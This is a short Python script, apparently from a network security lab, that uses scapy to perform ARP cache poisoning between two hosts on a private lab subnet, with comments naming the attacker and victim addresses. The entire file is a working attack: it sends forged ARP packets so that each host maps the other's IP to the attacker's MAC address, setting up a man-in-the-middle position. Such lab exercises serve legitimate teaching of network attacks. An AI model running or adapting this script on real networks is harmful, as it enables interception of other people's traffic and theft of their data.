#!/usr/bin/env python3
from scapy.all import *

# ***********************************************************************
# attacker is  10.9.0.105  ether   02:42:0a:09:00:69   C  br-9c30b8bbbc0f
#
#   host a is  10.9.0.5    ether   02:42:0a:09:00:05   C  br-9c30b8bbbc0f
#   host b is  10.9.0.6    ether   02:42:0a:09:00:06   C  br-9c30b8bbbc0f
# ***********************************************************************

def send_ARP_packet(mac_dst, mac_src, ip_dst, ip_src):
   E = Ether(dst=mac_dst, src=mac_src)
   A = ARP(hwsrc=mac_src, psrc=ip_src, hwdst=mac_dst, pdst=ip_dst)
   pkt = E/A
   sendp(pkt)
   
send_ARP_packet('02:42:0a:09:00:05','02:42:0a:09:00:69','10.9.0.5','10.9.0.6')
send_ARP_packet('02:42:0a:09:00:06','02:42:0a:09:00:69','10.9.0.6','10.9.0.5')
